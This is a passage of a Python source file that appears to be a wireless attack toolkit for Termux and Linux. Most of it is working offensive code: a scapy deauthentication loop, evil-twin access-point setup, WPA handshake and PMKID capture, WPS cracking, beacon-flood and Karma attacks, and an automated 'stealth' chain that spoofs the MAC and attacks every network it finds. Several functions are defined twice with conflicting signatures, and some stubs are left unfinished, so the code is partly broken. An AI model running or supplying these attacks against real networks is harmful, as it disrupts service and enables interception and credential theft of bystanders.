            missing_headers = [header for header in security_headers if header not in response.headers]
            if missing_headers:
                results["vulnerabilities"].append({
                    "type": "web",
                    "port": port,
                    "finding": f"Missing security headers: {', '.join(missing_headers)}",
                    "severity": "medium"
                })
                
        except requests.exceptions.RequestException:
            continue

    return results

def check_platform():
    if "termux" in os.environ.get("PREFIX", ""):
        print(f"{Fore.YELLOW}[*] Running in Termux environment")
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] Some features require root access{Fore.RESET}")
    else:
        print(f"{Fore.YELLOW}[*] Running in standard environment{Fore.RESET}")

def run_wireless_attacks(target_type="wifi"):
    check_platform()
    print(f"\n{Fore.BLUE}[*] Starting Wireless Attack Module{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Attack Type: {target_type.upper()}")
    print(f"\n[*] Available Attacks:")
    print(f"[1] WiFi Network Discovery")
    print(f"[2] Bluetooth Device Discovery")
    print(f"[3] WiFi Deauth Attack")
    print(f"[4] Bluetooth MITM")
    print(f"[5] Hotspot Evil Twin")
    print(f"\n[*] Requirements:")
    print(f"- WiFi adapter in monitor mode")
    print(f"- Bluetooth adapter")
    print(f"- Root/Administrator privileges{Fore.RESET}\n")

    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This module requires root privileges{Fore.RESET}")
        return

    results = {"wireless": {}}

    if target_type == "wifi":
        run_wifi_attacks()
    else:
        run_bluetooth_attacks()

def run_wifi_attacks():
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, RadioTap
    
    print(f"\n{Fore.BLUE}[*] Starting WiFi Attacks{Fore.RESET}")
    interface = input(f"{Fore.CYAN}Enter wireless interface (e.g., wlan0): {Fore.RESET}")
    
    # Enable monitor mode
    try:
        subprocess.run(f"airmon-ng start {interface}", shell=True)
        monitor_interface = f"{interface}mon"
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to enable monitor mode: {e}{Fore.RESET}")
        return

    networks = []
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Beacon].network_stats().get("ssid")
            bssid = pkt[Dot11].addr3
            channel = int(ord(pkt[Dot11Beacon].payload.info[-4:-3]))
            networks.append({"ssid": ssid, "bssid": bssid, "channel": channel})
            print(f"{Fore.GREEN}[+] Found Network: {ssid} ({bssid}) - Channel: {channel}{Fore.RESET}")

    print(f"\n{Fore.YELLOW}[*] Scanning for WiFi networks... (30 seconds){Fore.RESET}")
    scapy.sniff(iface=monitor_interface, prn=packet_handler, timeout=30)

    if networks:
        print(f"\n{Fore.GREEN}[+] Found {len(networks)} networks{Fore.RESET}")
        target_bssid = input(f"{Fore.CYAN}Enter target BSSID: {Fore.RESET}")
        
        print(f"\n{Fore.YELLOW}[*] Available Attacks:{Fore.RESET}")
        print("1. Deauth Attack")
        print("2. Evil Twin")
        
        attack_choice = input(f"{Fore.CYAN}Select attack: {Fore.RESET}")
        
        if attack_choice == "1":
            run_deauth_attack(monitor_interface, target_bssid)
        elif attack_choice == "2":
            run_evil_twin(interface, target_bssid)

def run_deauth_attack(interface, target_bssid):
    print(f"\n{Fore.BLUE}[*] Starting Deauthentication Attack{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target_bssid}")
    print(f"[+] Interface: {interface}")
    print(f"[+] Press Ctrl+C to stop{Fore.RESET}\n")
    
    deauth = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", 
                             addr2=target_bssid, 
                             addr3=target_bssid)/Dot11Deauth()
    
    try:
        while True:
            scapy.send(deauth, iface=interface, count=1, verbose=False)
            print(f"{Fore.GREEN}[+] Deauth packet sent{Fore.RESET}")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Deauth attack stopped{Fore.RESET}")

def run_evil_twin(interface, target_bssid):
    print(f"\n{Fore.BLUE}[*] Starting Evil Twin Attack{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Target: {target_bssid}")
    print(f"[+] Setting up fake AP...")
    print(f"[+] Starting DHCP server...")
    print(f"[+] Enabling IP forwarding...{Fore.RESET}\n")
    
    # Setup hostapd
    hostapd_conf = """interface={}
ssid={}
channel=1
driver=nl80211""".format(interface, "Free_WiFi")
    
    with open("hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    
    # Setup dnsmasq
    dnsmasq_conf = """interface={}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp""".format(interface)
    
    with open("dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    
    try:
        # Start services
        subprocess.Popen(["hostapd", "hostapd.conf"])
        subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf"])
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        
        print(f"{Fore.GREEN}[+] Evil Twin AP running{Fore.RESET}")
        input("Press Enter to stop...")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping Evil Twin...{Fore.RESET}")
    finally:
        # Cleanup
        subprocess.run("killall hostapd dnsmasq", shell=True)
        os.remove("hostapd.conf")
        os.remove("dnsmasq.conf")

async def run_bluetooth_scan_windows():
    print(f"\n{Fore.BLUE}[*] Starting Bluetooth Discovery{Fore.RESET}")
    print(f"{Fore.YELLOW}[+] Scanning for nearby devices...{Fore.RESET}\n")
    
    try:
        scanner = bluetooth_alt.BleakScanner()
        devices = await scanner.discover()
        
        print(f"{Fore.GREEN}[+] Found {len(devices)} devices:{Fore.RESET}")
        for device in devices:
            print(f"  {device.address} - {device.name or 'Unknown'}")
            
        if devices:
            target_addr = input(f"\n{Fore.CYAN}Enter target address: {Fore.RESET}")
            print(f"\n{Fore.YELLOW}[*] Available Actions:{Fore.RESET}")
            print("1. Connect to Device")
            print("2. Scan Services")
            
            choice = input(f"{Fore.CYAN}Select option: {Fore.RESET}")
            if choice == "1":
                await connect_to_device(target_addr)
                
    except Exception as e:
        print(f"{Fore.RED}[-] Bluetooth scan failed: {e}{Fore.RESET}")

async def connect_to_device(address):
    try:
        device = bluetooth_alt.BleakClient(address)
        await device.connect()
        print(f"{Fore.GREEN}[+] Connected to {address}{Fore.RESET}")
        services = await device.get_services()
        print(f"\n{Fore.GREEN}[+] Available Services:{Fore.RESET}")
        for service in services:
            print(f"  Service: {service.uuid}")
        await device.disconnect()
    except Exception as e:
        print(f"{Fore.RED}[-] Connection failed: {e}{Fore.RESET}")

def run_bluetooth_attacks():
    if os.name == 'nt':  # Windows
        asyncio.run(run_bluetooth_scan_windows())
    else:  # Linux/Termux
        # Original bluetooth code here
        import bluetooth
        # ... rest of the original code ...

def check_os():
    print(f"\n{Fore.GREEN}=== Platform Selection ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Windows 10")
    print(f"[2] Termux/Android")
    print(f"[3] Linux{Fore.RESET}")
    
    while True:
        platform = input(f"\n{Fore.CYAN}Select your platform (1-3): {Fore.RESET}")
        if platform in ['1', '2', '3']:
            return platform

def setup_environment(platform):
    if platform == '1':  # Windows 10
        print(f"\n{Fore.BLUE}[*] Setting up Windows 10 environment{Fore.RESET}")
        try:
            import bleak
            import asyncio
            print(f"{Fore.GREEN}[+] Bluetooth modules loaded")
        except ImportError:
            print(f"{Fore.RED}[!] Missing packages. Run:")
            print("pip install bleak asyncio{Fore.RESET}")
    
    elif platform == '2':  # Termux
        print(f"\n{Fore.BLUE}[*] Setting up Termux environment{Fore.RESET}")
        if "termux" not in os.environ.get("PREFIX", ""):
            print(f"{Fore.RED}[!] Not running in Termux environment{Fore.RESET}")
            sys.exit(1)
        if os.geteuid() != 0:
            print(f"{Fore.YELLOW}[!] Warning: Not running as root")
            print(f"[!] Some features will be limited{Fore.RESET}")
    
    elif platform == '3':  # Linux
        print(f"\n{Fore.BLUE}[*] Setting up Linux environment{Fore.RESET}")
        try:
            import bluetooth
            print(f"{Fore.GREEN}[+] Bluetooth modules loaded{Fore.RESET}")
        except ImportError:
            print(f"{Fore.RED}[!] Missing packages. Run:")
            print("sudo apt install python3-bluetooth{Fore.RESET}")

def setup_termux_environment():
    print(f"\n{Fore.BLUE}[*] Setting up Termux Environment{Fore.RESET}")
    try:
        # Core packages
        print(f"{Fore.YELLOW}[+] Installing core packages...{Fore.RESET}")
        os.system("pkg update -y && pkg upgrade -y")
        os.system("pkg install -y root-repo")
        os.system("pkg install -y python nmap wireless-tools tcpdump")
        os.system("pkg install -y python-dev libbluetooth bluetooth")
        os.system("pkg install -y aircrack-ng")  # For WiFi attacks
        
        # Python packages
        print(f"{Fore.YELLOW}[+] Installing Python packages...{Fore.RESET}")
        os.system("pip install --upgrade pip")
        os.system("pip install colorama requests python-nmap scapy pybluez")
        
        print(f"\n{Fore.GREEN}[+] Termux setup completed!")
        print(f"[*] For full functionality, run:")
        print(f"[*] termux-setup-storage")
        print(f"[*] pkg install root-repo{Fore.RESET}")
        
    except Exception as e:
        print(f"{Fore.RED}[-] Setup failed: {e}{Fore.RESET}")
        return False
    return True

def check_termux_requirements():
    print(f"\n{Fore.BLUE}[*] Checking Termux requirements{Fore.RESET}")
    
    # Check root access
    if os.geteuid() != 0:
        print(f"{Fore.YELLOW}[!] Warning: Not running as root")
        print(f"[!] Some features will be limited")
        print(f"[!] Try running with: pkg install tsu && tsu{Fore.RESET}")
    
    # Check wireless interface
    try:
        interfaces = os.listdir('/sys/class/net')
        wireless = [x for x in interfaces if x.startswith('wlan')]
        if wireless:
            print(f"{Fore.GREEN}[+] Found wireless interfaces: {', '.join(wireless)}{Fore.RESET}")
        else:
            print(f"{Fore.RED}[!] No wireless interfaces found{Fore.RESET}")
    except:
        print(f"{Fore.RED}[!] Cannot check wireless interfaces{Fore.RESET}")
    
    # Check Bluetooth
    try:
        import bluetooth
        print(f"{Fore.GREEN}[+] Bluetooth support available{Fore.RESET}")
    except:
        print(f"{Fore.RED}[!] Bluetooth support not available{Fore.RESET}")

def run_termux_wireless_menu():
    print(f"\n{Fore.GREEN}=== Termux Wireless Attacks ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] WiFi Network Scanner")
    print(f"[2] Bluetooth Device Scanner")
    print(f"[3] WiFi Deauth Attack")
    print(f"[4] Bluetooth MITM")
    print(f"[5] Hotspot Evil Twin")
    print(f"[6] Back to Main Menu{Fore.RESET}")
    
    choice = input(f"\n{Fore.CYAN}Select option: {Fore.RESET}")
    return choice

def run_wifi_scanner():
    print(f"\n{Fore.BLUE}[*] Starting WiFi Scanner{Fore.RESET}")
    results = {"wifi_scan": {}}
    
    try:
        interface = input(f"{Fore.CYAN}Enter wireless interface (e.g., wlan0): {Fore.RESET}")
        os.system(f"airmon-ng start {interface}")
        os.system(f"airodump-ng {interface}mon")
        results["wifi_scan"]["status"] = "completed"
    except Exception as e:
        print(f"{Fore.RED}[-] Scan failed: {e}{Fore.RESET}")
        results["wifi_scan"]["status"] = "failed"
    return results

def run_bluetooth_scanner():
    print(f"\n{Fore.BLUE}[*] Starting Bluetooth Scanner{Fore.RESET}")
    results = {"bluetooth_scan": {}}
    
    try:
        print(f"{Fore.YELLOW}[+] Scanning for nearby devices...{Fore.RESET}")
        nearby_devices = bluetooth.discover_devices(lookup_names=True)
        results["bluetooth_scan"]["devices"] = []
        
        for addr, name in nearby_devices:
            print(f"{Fore.GREEN}[+] {addr} - {name}{Fore.RESET}")
            results["bluetooth_scan"]["devices"].append({"address": addr, "name": name})
        
        results["bluetooth_scan"]["status"] = "completed"
    except Exception as e:
        print(f"{Fore.RED}[-] Scan failed: {e}{Fore.RESET}")
        results["bluetooth_scan"]["status"] = "failed"
    return results

def run_deauth_attack():
    print(f"\n{Fore.BLUE}[*] Starting Deauth Attack{Fore.RESET}")
    results = {"deauth": {}}
    
    try:
        interface = input(f"{Fore.CYAN}Enter wireless interface: {Fore.RESET}")
        target_mac = input(f"{Fore.CYAN}Enter target MAC: {Fore.RESET}")
        ap_mac = input(f"{Fore.CYAN}Enter AP MAC: {Fore.RESET}")
        
        os.system(f"aireplay-ng --deauth 0 -a {ap_mac} -c {target_mac} {interface}mon")
        results["deauth"]["status"] = "completed"
    except Exception as e:
        print(f"{Fore.RED}[-] Attack failed: {e}{Fore.RESET}")
        results["deauth"]["status"] = "failed"
    return results

def run_bluetooth_mitm():
    print(f"\n{Fore.BLUE}[*] Starting Bluetooth MITM{Fore.RESET}")
    results = {"bluetooth_mitm": {}}
    
    try:
        target_addr = input(f"{Fore.CYAN}Enter target Bluetooth address: {Fore.RESET}")
        print(f"{Fore.YELLOW}[+] Attempting MITM attack...{Fore.RESET}")
        
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((target_addr, 1))
        results["bluetooth_mitm"]["status"] = "connected"
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}[-] MITM failed: {e}{Fore.RESET}")
        results["bluetooth_mitm"]["status"] = "failed"
    return results

def run_evil_twin():
    print(f"\n{Fore.BLUE}[*] Starting Evil Twin Attack{Fore.RESET}")
    results = {"evil_twin": {}}
    
    try:
        interface = input(f"{Fore.CYAN}Enter wireless interface: {Fore.RESET}")
        ssid = input(f"{Fore.CYAN}Enter SSID to clone: {Fore.RESET}")
        
        os.system(f"airbase-ng -e '{ssid}' -c 1 {interface}mon")
        results["evil_twin"]["status"] = "running"
    except Exception as e:
        print(f"{Fore.RED}[-] Attack failed: {e}{Fore.RESET}")
        results["evil_twin"]["status"] = "failed"
    return results

def run_advanced_bluetooth_attacks():
    print(f"\n{Fore.GREEN}=== Advanced Bluetooth Attacks ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Bluetooth Scanner (Discovery)")
    print(f"[2] Service Enumeration")
    print(f"[3] Bluetooth Spoofing")
    print(f"[4] MITM Attack")
    print(f"[5] Bluetooth Sniffing")
    print(f"[6] PIN Cracking")
    print(f"[7] Back{Fore.RESET}")
    
    results = {"bluetooth_attacks": {}}
    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
    
    try:
        if choice == '1':
            # Enhanced Scanner
            print(f"{Fore.YELLOW}[+] Starting deep scan...{Fore.RESET}")
            nearby_devices = bluetooth.discover_devices(
                duration=8,
                lookup_names=True,
                lookup_class=True,
                device_id=-1
            )
            for addr, name, device_class in nearby_devices:
                print(f"{Fore.GREEN}[+] Address: {addr}")
                print(f"[+] Name: {name}")
                print(f"[+] Class: {device_class}{Fore.RESET}")
                
        elif choice == '2':
            # Service Discovery
            addr = input(f"{Fore.CYAN}Enter target address: {Fore.RESET}")
            services = bluetooth.find_service(address=addr)
            for svc in services:
                print(f"{Fore.GREEN}[+] Service Name: {svc['name']}")
                print(f"[+] Protocol: {svc['protocol']}")
                print(f"[+] Port: {svc['port']}")
                print(f"[+] Provider: {svc.get('provider', 'Unknown')}{Fore.RESET}")
        
        results["status"] = "completed"
    except Exception as e:
        print(f"{Fore.RED}[-] Attack failed: {e}{Fore.RESET}")
        results["status"] = "failed"
        results["error"] = str(e)
    finally:
        return results

def run_advanced_wifi_attacks():
    print(f"\n{Fore.GREEN}=== Advanced WiFi Attacks ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Network Scanner")
    print(f"[2] WPA/WPA2 Handshake Capture")
    print(f"[3] Evil Twin + Captive Portal")
    print(f"[4] Client Deauth")
    print(f"[5] Beacon Flood")
    print(f"[6] Karma Attack")
    print(f"[7] Back{Fore.RESET}")
    
    results = {"wifi_attacks": {}}
    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
    
    try:
        if choice == '1':
            interface = input(f"{Fore.CYAN}Interface (wlan0): {Fore.RESET}") or "wlan0"
            print(f"{Fore.YELLOW}[+] Enabling monitor mode...")
            os.system(f"airmon-ng start {interface}")
            os.system(f"airodump-ng {interface}mon")
            
        elif choice == '2':
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            target_bssid = input(f"{Fore.CYAN}Target BSSID: {Fore.RESET}")
            channel = input(f"{Fore.CYAN}Channel: {Fore.RESET}")
            
            print(f"{Fore.YELLOW}[+] Starting handshake capture...")
            os.system(f"airodump-ng -c {channel} --bssid {target_bssid} -w capture {interface}mon")
            
        elif choice == '3':
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            ssid = input(f"{Fore.CYAN}SSID to clone: {Fore.RESET}")
            
            print(f"{Fore.YELLOW}[+] Setting up Evil Twin...")
            os.system(f"airbase-ng -e '{ssid}' -c 1 {interface}mon")
            print(f"{Fore.YELLOW}[+] Setting up DHCP...")
            os.system("dnsmasq -C dnsmasq.conf")
            print(f"{Fore.YELLOW}[+] Enabling IP forwarding...")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            
        elif choice == '4':
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            target = input(f"{Fore.CYAN}Target MAC: {Fore.RESET}")
            ap = input(f"{Fore.CYAN}AP MAC: {Fore.RESET}")
            
            print(f"{Fore.YELLOW}[+] Starting deauth attack...")
            os.system(f"aireplay-ng --deauth 0 -a {ap} -c {target} {interface}mon")
            
        elif choice == '5':
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            print(f"{Fore.YELLOW}[+] Starting beacon flood...")
            os.system(f"mdk3 {interface}mon b -c 1")
            
        elif choice == '6':
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            print(f"{Fore.YELLOW}[+] Starting Karma attack...")
            os.system(f"mdk3 {interface}mon p -t")
            
        results["status"] = "completed"
    except Exception as e:
        print(f"{Fore.RED}[-] Attack failed: {e}{Fore.RESET}")
        results["status"] = "failed"
        results["error"] = str(e)
    finally:
        return results

def run_stealth_attack_chain():
    print(f"\n{Fore.GREEN}=== Stealth Attack Chain ==={Fore.RESET}")
    results = {"attack_chain": {}}
    
    try:
        # 1. Enable Stealth
        print(f"{Fore.YELLOW}[+] Enabling stealth mode...")
        os.system("macchanger -r wlan0")  # Random MAC
        os.system("iwconfig wlan0 txpower 10")  # Lower power
        
        # 2. Passive Recon
        print(f"{Fore.YELLOW}[+] Starting passive reconnaissance...")
        networks = []
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Beacon].network_stats().get("ssid")
                if ssid not in [n["ssid"] for n in networks]:
                    networks.append({
                        "ssid": ssid,
                        "bssid": pkt[Dot11].addr3,
                        "channel": int(ord(pkt[Dot11Beacon].payload.info[-4:-3])),
                        "clients": []
                    })
        
        # 3. Smart Data Collection
        print(f"{Fore.YELLOW}[+] Collecting network data...")
        scapy.sniff(iface="wlan0mon", prn=packet_handler, timeout=30)
        
        # 4. Automated Attack Selection
        for network in networks:
            if network["clients"]:  # Has clients
                print(f"{Fore.YELLOW}[+] Running deauth attack on {network['ssid']}")
                run_deauth_attack("wlan0mon", network["bssid"])
            else:  # No clients
                print(f"{Fore.YELLOW}[+] Setting up evil twin for {network['ssid']}")
                run_evil_twin("wlan0mon", network["bssid"])
                
        results["status"] = "completed"
        results["networks"] = networks
        
    except Exception as e:
        print(f"{Fore.RED}[-] Attack chain failed: {str(e)}{Fore.RESET}")
        results["status"] = "failed"
        results["error"] = str(e)
    finally:
        # Cleanup stealth mode
        os.system("macchanger -p wlan0")
        os.system("iwconfig wlan0 txpower 20")
        return results

def enhanced_data_collection():
    data = {
        "networks": [],
        "bluetooth": [],
        "captured_handshakes": [],
        "credentials": []
    }
    
    try:
        # WiFi Data
        print(f"{Fore.YELLOW}[+] Collecting WiFi data...")
        wifi_data = run_wifi_scanner()
        data["networks"] = wifi_data.get("networks", [])
        
        # Bluetooth Data
        print(f"{Fore.YELLOW}[+] Collecting Bluetooth data...")
        bt_data = run_bluetooth_scanner()
        data["bluetooth"] = bt_data.get("devices", [])
        
        # Save data
        with open("collected_data.json", "w") as f:
            json.dump(data, f, indent=4)
            
    except Exception as e:
        print(f"{Fore.RED}[-] Data collection failed: {str(e)}{Fore.RESET}")
    finally:
        return data

def new_attack_vectors():
    print(f"\n{Fore.GREEN}=== Advanced Attack Vectors ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] WPS Attack")
    print(f"[2] PMKID Attack")
    print(f"[3] Bluetooth Jamming")
    print(f"[4] Captive Portal Clone")
    print(f"[5] Client Blacklisting")
    print(f"[6] Back{Fore.RESET}")
    
    choice = input(f"\n{Fore.CYAN}Select attack vector: {Fore.RESET}")
    results = {"new_vectors": {}}
    
    try:
        if choice == "1":
            # WPS Attack
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            os.system(f"reaver -i {interface}mon -b <BSSID>")
            
        elif choice == "2":
            # PMKID Attack
            interface = input(f"{Fore.CYAN}Interface: {Fore.RESET}")
            os.system(f"hcxdumptool -i {interface}mon -o pmkid.pcapng --enable_status=1")
            
        results["status"] = "completed"
    except Exception as e:
        print(f"{Fore.RED}[-] Attack failed: {str(e)}{Fore.RESET}")
        results["status"] = "failed"
        results["error"] = str(e)
    finally:
        return results

def error_handler(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Attack interrupted by user{Fore.RESET}")
            cleanup_resources()
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Fore.RESET}")
            log_error(e)
        finally:
            cleanup_resources()
    return wrapper

def cleanup_resources():
    try:
        # Reset network interfaces
        os.system("airmon-ng stop wlan0mon")
        os.system("macchanger -p wlan0")
        os.system("iwconfig wlan0 txpower 20")
        
        # Kill processes
        os.system("killall hostapd dnsmasq")
        
        # Remove temp files
        os.system("rm -f *.cap *.csv *.netxml")
    except Exception as e:
        print(f"{Fore.RED}[-] Cleanup failed: {str(e)}{Fore.RESET}")

def log_error(error):
    with open("error_log.txt", "a") as f:
        f.write(f"{datetime.now()} - {str(error)}\n")

def manage_mac_address():
    print(f"\n{Fore.GREEN}=== MAC Address Management ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Show current MAC")
    print(f"[2] Randomize MAC")
    print(f"[3] Restore original MAC")
    print(f"[4] Back{Fore.RESET}")
    
    try:
        choice = input(f"\n{Fore.CYAN}Select option: {Fore.RESET}")
        interface = input(f"{Fore.CYAN}Interface (wlan0): {Fore.RESET}") or "wlan0"
        
        if choice == "1":
            # Show current MAC
            os.system(f"macchanger -s {interface}")
            
        elif choice == "2":
            # Random MAC
            print(f"{Fore.YELLOW}[+] Randomizing MAC...{Fore.RESET}")
            os.system(f"macchanger -r {interface}")
            
        elif choice == "3":
            # Restore original MAC
            print(f"{Fore.YELLOW}[+] Restoring original MAC...{Fore.RESET}")
            os.system(f"macchanger -p {interface}")
            
    except Exception as e:
        print(f"{Fore.RED}[-] MAC change failed: {str(e)}{Fore.RESET}")

def manage_tx_power():
    print(f"\n{Fore.GREEN}=== Transmission Power Management ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Show current power")
    print(f"[2] Set custom power level")
    print(f"[3] Preset Power Levels:")
    print(f"    [a] Stealth Mode (10 dBm)")
    print(f"    [b] Normal Mode (15 dBm)")
    print(f"    [c] Maximum Mode (20 dBm)")
    print(f"[4] Back{Fore.RESET}")
    
    try:
        choice = input(f"\n{Fore.CYAN}Select option: {Fore.RESET}")
        interface = input(f"{Fore.CYAN}Interface (wlan0): {Fore.RESET}") or "wlan0"
        
        if choice == "1":
            # Show current power
            os.system(f"iwconfig {interface} | grep Tx-Power")
            
        elif choice == "2":
            # Custom power level
            power = input(f"{Fore.CYAN}Enter power level (1-20 dBm): {Fore.RESET}")
            if 1 <= int(power) <= 20:
                print(f"{Fore.YELLOW}[+] Setting custom power level to {power} dBm...{Fore.RESET}")
                os.system(f"iwconfig {interface} txpower {power}")
            else:
                print(f"{Fore.RED}[-] Invalid power level. Use 1-20 dBm{Fore.RESET}")
                
        elif choice == "3":
            preset = input(f"{Fore.CYAN}Select preset (a/b/c): {Fore.RESET}")
            if preset == "a":
                print(f"{Fore.YELLOW}[+] Setting stealth power (10 dBm)...{Fore.RESET}")
                os.system(f"iwconfig {interface} txpower 10")
                print(f"{Fore.GREEN}[+] Stealth mode activated - Reduced detection range{Fore.RESET}")
                
            elif preset == "b":
                print(f"{Fore.YELLOW}[+] Setting normal power (15 dBm)...{Fore.RESET}")
                os.system(f"iwconfig {interface} txpower 15")
                print(f"{Fore.GREEN}[+] Normal mode - Standard operating range{Fore.RESET}")
                
            elif preset == "c":
                print(f"{Fore.YELLOW}[+] Setting maximum power (20 dBm)...{Fore.RESET}")
                os.system(f"iwconfig {interface} txpower 20")
                print(f"{Fore.GREEN}[+] Maximum mode - Extended range{Fore.RESET}")
            
    except Exception as e:
        print(f"{Fore.RED}[-] Power change failed: {str(e)}{Fore.RESET}")
    finally:
        # Show current power after change
        os.system(f"iwconfig {interface} | grep Tx-Power")

def check_root():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Not running as root!")
        print(f"[!] Please run with 'tsu' first")
        print(f"[!] Install: pkg install tsu")
        print(f"[!] Then run: tsu")
        print(f"[!] Then: python automated.py{Fore.RESET}")
        return False
    return True

def main():
    if not check_root():
        sys.exit(1)
    init()  # Initialize colorama
    print(f"\n{Fore.RED}[!] For educational purposes only. Use responsibly.{Fore.RESET}")
    
    # Initialize results dictionary
    results = {}
    
    # Platform selection
    platform = check_os()
    setup_environment(platform)
    
    # Get target if needed
    target = input(f"\n{Fore.CYAN}Enter target IP/Host (or press Enter for local attacks): {Fore.RESET}")
    
    # ... rest of the main function ...

if __name__ == "__main__":
    main() 